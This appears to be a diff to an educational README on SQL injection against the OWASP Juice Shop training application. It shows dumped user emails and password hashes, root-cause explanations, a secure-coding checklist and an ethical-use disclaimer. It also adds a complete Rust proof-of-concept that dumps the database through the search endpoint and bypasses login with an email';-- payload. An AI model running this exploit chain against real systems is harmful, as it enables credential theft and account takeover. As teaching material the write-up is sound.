@@ -108,6 +108,10 @@ Keep-Alive: timeout=5
 {"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"","price":4,"deluxePrice":"0192023a7bbd73250516f069df18b500","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"jim@juice-sh.op","description":"","price":4,"deluxePrice":"e541ca7ecf72b8d1286474fc613e5e45","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bender@juice-sh.op","description":"","price":4,"deluxePrice":"0c36e517e3fa95aabf1bbffc6744a4ef","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bjoern.kimminich@gmail.com","description":"bkimminich","price":4,"deluxePrice":"6edd9d726cbdc873c539e41ae8757b8c","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"ciso@juice-sh.op","description":"","price":4,"deluxePrice":"861917d5fa5f1172f931dc700d81a8fb","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"support@juice-sh.op","description":"","price":4,"deluxePrice":"3869433d74e3d0c86fd25562f836bc82","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"morty@juice-sh.op","description":"","price":4,"deluxePrice":"f2f933d0bb0ba057bc8e33b8ebd6d9e8","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"mc.safesearch@juice-sh.op","description":"","price":4,"deluxePrice":"b03f4b0ba8b458fa0acdc02cdb953bc8","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"J12934@juice-sh.op","description":"","price":4,"deluxePrice":"3c2abc04e4a6ea8f1327d0aae3714b7d","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"wurstbrot@juice-sh.op","description":"wurstbrot","price":4,"deluxePrice":"9ad5b0492bbe528583e128d2a8941de4","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"amy@juice-sh.op","description":"","price":4,"deluxePrice":"030f05e45e30710c3ad3c32f00de0473","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bjoern@juice-sh.op","description":"","price":4,"deluxePrice":"7f311911af16fa8f418dd1a3051d6810","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"bjoern@owasp.org","description":"","price":4,"deluxePrice":"9283f1b2e9669749081963be0462e466","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"chris.pike@juice-sh.op","description":"","price":4,"deluxePrice":"10a783b9ed19ea1c67c3a27699f0095b","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"accountant@juice-sh.op","description":"","price":4,"deluxePrice":"963e10f92a70b4b463220cb4c5d636dc","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"uvogin@juice-sh.op","description":"","price":4,"deluxePrice":"05f92148b4b60f7dacd04cceebb8f1af","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"demo","description":"","price":4,"deluxePrice":"fe01ce2a7fbac8fafaed7c982a04e229","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"john@juice-sh.op","description":"j0hNny","price":4,"deluxePrice":"00479e957b6b42c459ee5746478e4d45","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"emma@juice-sh.op","description":"E=ma²","price":4,"deluxePrice":"402f1c4a75e316afec5a6ea63147f739","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"stan@juice-sh.op","description":"SmilinStan","price":4,"deluxePrice":"e9048a3f43dd5e094ef733f3bd88ea64","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"ethereum@juice-sh.op","description":"evmrox","price":4,"deluxePrice":"2c17c6393771ee3048ae34d6b380c5ec","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"testing@juice-sh.op","description":"","price":4,"deluxePrice":"b616a64605a07941fbd31868aea3b54b","image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}
 ```
 
+- Dynamic string concatenation: The code generated SQL by concatenating strings, directly substituting user input without parameters.
+- Lack of escaping/parameterization: Even if developers partially escaped quotes manually, this was often done inconsistently or incorrectly; parameterized  queries reliably solved the problem.
+- The application's response included the contents of the SQL result: the endpoint returned values ​​(name/email) in JSON, meaning the injection could have been used for data exfiltration.
+
 Key elements that change behavior:
 
 Single quote (') — closes the string literal;
@@ -167,7 +171,123 @@ Keep-Alive: timeout=5
 ```
 As result we can login and get the valid JWT Token for erlier deleted account.
 
+## Conclusion:
 
+- All SQL queries use parameter binding/prepared statements.
+- No format!/string concatenation for constructing SQL with user data.
+- Dynamic identifiers (columns, order) are whitelisted.
+- Passwords are stored only as secure hashes (argon2/bcrypt).
+- The database account has minimal privileges.
+- Logs do not contain direct query string values ​​with PII/secrets.
+- DAST/SAST are integrated into CI; tests cover potential payloads (characters ', --, %, _, \).
+
+This repository contains educational materials about SQL injection vulnerabilities and secure coding practices.
+Do NOT use any code, payloads or techniques from this repository against systems you do not own or do not have explicit written permission to test.
+
+Always run PoC and tests in an isolated, local environment (for example: OWASP Juice Shop inside Docker) or on systems specifically designated for security testing.
+Unauthorized testing may be illegal and may cause data loss and service disruption.
+
+## Rust script:
+
+```rust
+use std::{process, env};
+use std::error::Error;
+use reqwest::blocking::{Client, Response};
+use serde_json::{json, from_str, Value};
+
+
+struct Config {
+    ip_address: String,
+    port: u16,
+    payload: String,
+}
+
+impl Config {
+    fn new(mut args: std::env::Args) -> Result<Config, &'static str> {
+        args.next();
+        let ip_address = match args.next() {
+            Some(arg) => arg,
+            None => return Err("Didn't get an address argument"),
+        };
+        let port_arg = match args.next() {
+            Some(arg) => arg,
+            None => return Err("Didn't get an port argument"),
+        };
+        let port: u16 = match port_arg.parse::<u16>() {
+            Ok(p) => p,
+            Err(_) => return Err("Port argument must be a number between 0 and 65535"),
+        };
+        let payload = match args.next() {
+            Some(arg) => arg,
+            None => return Err("Didn't get any payload as argument"),
+        };
+        Ok(Config { ip_address, port, payload })
+    }
+}
+
+fn sql_injection(config: &Config) -> Result<Response, Box<dyn Error>> {
+    let url = format!("http://{}:{}/rest/products/search?q={}", config.ip_address, config.port, config.payload);
+    let client = Client::new();
+    let response = client.get(&url).send()?;
+
+    Ok(response)
+}
+
+fn searching_val(data_base: &str, query: &str) -> Result<String, Box<dyn std::error::Error>> {
+    let q = query.to_lowercase();
+    let v: Value = from_str(data_base)?;
+    if let Some(data) = v.get("data").and_then(|d| d.as_array()) {
+        for item in data {
+            if let Some(name) = item.get("name").and_then(|n| n.as_str()) {
+                if name.to_lowercase().contains(&q) && name.contains('@') {
+                    return Ok(name.to_string());
+                }
+            }
+        }
+    }
+    Err(format!("Email containing '{}' not found", query).into())
+}  
+
+fn login(email: &str, config: &Config) -> Result<Response, Box<dyn Error>> {
+    let url = format!("http://{}:{}/rest/user/login",config.ip_address, config.port);
+    let client = Client::builder().build()?;
+    let username = format!("{}';--", email);
+    let password = String::from("password");
+    let payload = json!({
+        "email": username,
+        "password": password
+    });
+    let response = client.post(&url).json(&payload).send()?;
+
+    Ok(response)
+
+}
+
+fn run(config: Config, ) -> Result<(), Box<dyn Error>> {
+    let sql_response = sql_injection(&config)?;
+    println!("[*] Status: {:?}", sql_response.status());
+    let data_base = sql_response.text()?;
+    println!("[*] Data base: {:?}", data_base);
+    let email = searching_val(&data_base, "chris")?;
+    println!("Found email: {}", email);
+    let access = login(&email, &config)?;
+    println!("[*] Login status: {:?}", access.status());
+    println!("[*] Login response: {:?}", access.text());
+    Ok(())
+}
+
+fn main() {
+    let config = Config::new(env::args()).unwrap_or_else(|err| {
+        eprintln!("Problem with parsing arguments{}", err);
+        process::exit(1);
+    });
+    println!("[*] Starting client {}:{}{}", config.ip_address, config.port, config.payload);
+    if let Err(err) = run(config) {
+        eprintln!("Application error {}", err);
+        process::exit(1);
+    }
+}
+```
 
 
 
